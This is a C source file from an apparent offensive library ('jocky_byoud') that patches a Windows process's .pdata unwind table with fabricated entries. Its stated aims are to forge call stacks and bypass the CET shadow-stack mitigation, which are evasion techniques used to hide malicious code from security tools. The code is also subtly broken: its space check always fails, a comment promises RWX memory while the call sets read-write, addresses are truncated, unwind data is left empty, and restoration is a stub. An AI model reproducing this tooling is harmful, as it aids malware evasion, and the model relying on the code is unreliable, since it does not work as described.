#include <windows.h>
#include <winnt.h>
#include "../include/jocky_byoud.h"
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

static RUNTIME_FUNCTION* g_original_pdata = NULL;
static SIZE_T g_pdata_size = 0;
static BOOLEAN g_cet_enabled = FALSE;

/* Win10 1903+ SDK types — guard for older MinGW toolchains */
#ifndef ProcessUserShadowStackPolicy
#define ProcessUserShadowStackPolicy ((PROCESS_MITIGATION_POLICY)11)
typedef struct _PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY {
    union {
        DWORD Flags;
        struct { DWORD EnableUserShadowStack : 1; DWORD ReservedFlags : 31; };
    };
} PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY;
#endif

int jocky_byoud_initialize(void) {
    PROCESS_MITIGATION_USER_SHADOW_STACK_POLICY policy;
    memset(&policy, 0, sizeof(policy));
    if (GetProcessMitigationPolicy(GetCurrentProcess(),
                                   ProcessUserShadowStackPolicy,
                                   &policy,
                                   sizeof(policy))) {
        g_cet_enabled = policy.EnableUserShadowStack ? TRUE : FALSE;
    }
    return 0;
}

int jocky_byoud_create_fake_function(
    uint32_t begin_addr,
    uint32_t end_addr,
    RUNTIME_FUNCTION* out_func) {

    if (!out_func) {
        return -1;
    }

    out_func->BeginAddress = begin_addr;
    out_func->EndAddress = end_addr;
    out_func->UnwindData = 0;  /* Will be filled by caller */

    return 0;
}

int jocky_byoud_create_fake_unwind_info(
    uint8_t frame_register,
    uint8_t frame_offset,
    const UNWIND_CODE* codes,
    int code_count,
    UNWIND_INFO* out_info) {

    if (!out_info || code_count < 0 || code_count > 255) {
        return -1;
    }

    /* Initialize UNWIND_INFO */
    out_info->Version = 1;           /* UNWIND version 1 */
    out_info->Flags = 0;             /* No exception handler */
    out_info->SizeOfProlog = 0;      /* Will be filled by caller */
    out_info->CountOfCodes = code_count;
    out_info->FrameRegister = frame_register;
    out_info->FrameOffset = frame_offset;

    /* Copy unwind codes if provided */
    if (codes && code_count > 0) {
        UNWIND_CODE* dest = (UNWIND_CODE*)(out_info + 1);
        memcpy(dest, codes, code_count * sizeof(UNWIND_CODE));
    }

    return 0;
}

int jocky_byoud_patch_pdata(
    const RUNTIME_FUNCTION* fake_funcs,
    int func_count) {

    if (!fake_funcs || func_count <= 0) {
        return -1;
    }

    /* Get module handle for current executable */
    HMODULE hModule = GetModuleHandle(NULL);
    if (!hModule) {
        return -1;
    }

    /* Get PE header */
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        return -1;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        return -1;
    }

    /* Find .pdata section */
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);
    PIMAGE_SECTION_HEADER pPdataSection = NULL;

    for (int i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSection[i].Name, ".pdata") == 0) {
            pPdataSection = &pSection[i];
            break;
        }
    }

    if (!pPdataSection) {
        return -1;
    }

    /* Get pointer to .pdata section */
    RUNTIME_FUNCTION* pPdata = (RUNTIME_FUNCTION*)
        ((BYTE*)hModule + pPdataSection->VirtualAddress);

    /* Save original pdata size */
    g_pdata_size = pPdataSection->SizeOfRawData / sizeof(RUNTIME_FUNCTION);

    /* Try to change page protection to RWX */
    DWORD oldProtect;
    SIZE_T protectSize = pPdataSection->SizeOfRawData;

    if (!VirtualProtect(pPdata, protectSize, PAGE_READWRITE, &oldProtect)) {
        return -1;
    }

    /* Inject fake functions into pdata (append to existing) */
    int existing_count = g_pdata_size;
    if (existing_count + func_count > g_pdata_size) {
        /* Not enough space, would need to resize section */
        VirtualProtect(pPdata, protectSize, oldProtect, &oldProtect);
        return -1;
    }

    /* Copy fake function entries */
    for (int i = 0; i < func_count; i++) {
        pPdata[existing_count + i] = fake_funcs[i];
    }

    /* Restore original protection */
    VirtualProtect(pPdata, protectSize, oldProtect, &oldProtect);

    /* Flush instruction cache to ensure changes are visible */
    FlushInstructionCache(GetCurrentProcess(), pPdata, protectSize);

    return 0;
}

int jocky_byoud_forge_call_stack(
    const uint64_t* spoofed_addresses,
    int address_count) {

    if (!spoofed_addresses || address_count <= 0 || address_count > 32) {
        return -1;
    }

    /* Create fake RUNTIME_FUNCTION entries for each spoofed address */
    RUNTIME_FUNCTION* fake_funcs = (RUNTIME_FUNCTION*)malloc(
        address_count * sizeof(RUNTIME_FUNCTION));

    if (!fake_funcs) {
        return -1;
    }

    /* Create function entries that will pass unwinding */
    for (int i = 0; i < address_count; i++) {
        uint64_t addr = spoofed_addresses[i];

        /* Create fake range for this address */
        fake_funcs[i].BeginAddress = (uint32_t)(addr & 0xFFFFFFFF);
        fake_funcs[i].EndAddress = fake_funcs[i].BeginAddress + 0x100;
        fake_funcs[i].UnwindData = 0;  /* Points to UNWIND_INFO */
    }

    /* Inject fake functions into pdata */
    int result = jocky_byoud_patch_pdata(fake_funcs, address_count);

    free(fake_funcs);
    return result;
}

int jocky_byoud_check_and_bypass_cet(void) {
    /* Check if CET is enabled */
    if (!g_cet_enabled) {
        /* CET not enabled, standard techniques still work */
        return 0;
    }

    /* CET is enabled, use BYOUD to bypass */
    /* Create legitimate-looking unwinding data */
    RUNTIME_FUNCTION dummy_func;
    dummy_func.BeginAddress = (uint32_t)jocky_byoud_check_and_bypass_cet;
    dummy_func.EndAddress = dummy_func.BeginAddress + 0x1000;
    dummy_func.UnwindData = 0;

    return jocky_byoud_patch_pdata(&dummy_func, 1);
}

int jocky_byoud_restore_unwind_tables(void) {
    /* Restoration would require saving original pdata before modification */
    /* For now, this is a placeholder for cleanup operations */

    /* In a real scenario, you would:
     * 1. Restore original .pdata section contents
     * 2. Flush instruction cache
     * 3. Re-protect pages
     */

    return 0;
}
